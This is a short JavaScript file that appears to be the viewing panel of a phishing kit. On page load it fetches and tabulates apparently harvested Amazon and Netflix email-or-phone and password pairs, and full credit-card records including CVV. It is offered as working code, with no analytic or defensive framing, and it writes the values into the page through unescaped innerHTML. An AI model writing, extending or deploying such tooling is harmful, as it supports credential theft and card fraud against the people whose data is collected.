
// Fetch data from server and display it in the browser
async function fetchData(endpoint, tableId) {
  try {
    const response = await fetch(endpoint);
    const data = await response.json();

    const tableBody = document.getElementById(tableId);
    data.forEach(row => {
      const tr = document.createElement('tr');
      tr.innerHTML = `<td>${row.EMAIL_OR_PHONE}</td><td>${row.PASSWORD}</td>`;
      tableBody.appendChild(tr);
    });
  } catch (error) {
    console.error('Error fetching data:', error);
  }
}

async function fetchCardData(endpoint, tableId) {
  try {
    const response = await fetch(endpoint);
    const data = await response.json();

    const tableBody = document.getElementById(tableId);
    tableBody.innerHTML = ''; // Clear existing data in the table

    data.forEach(row => {
      let nameOnCard = row.NAME_ON_CARD || '';
      let cardNumber = row.CARD_NUMBER || '';
      let expiredDate = row.EXPIRED_DATE || '';
      let cvv = row.CVV || '';

      const tr = document.createElement('tr');
      tr.innerHTML = `<td>${nameOnCard}</td><td>${cardNumber}</td><td>${expiredDate}</td><td>${cvv}</td>`;
      tableBody.appendChild(tr);
    });
  } catch (error) {
    console.error('Error fetching credit card data:', error);
  }
}



window.onload = function () {
  fetchData('/amazonData', 'AmazonDataBody');
  fetchData('/netflixData', 'NetflixDataBody');
  fetchCardData('/creditCardData', 'CardDataBody');
};

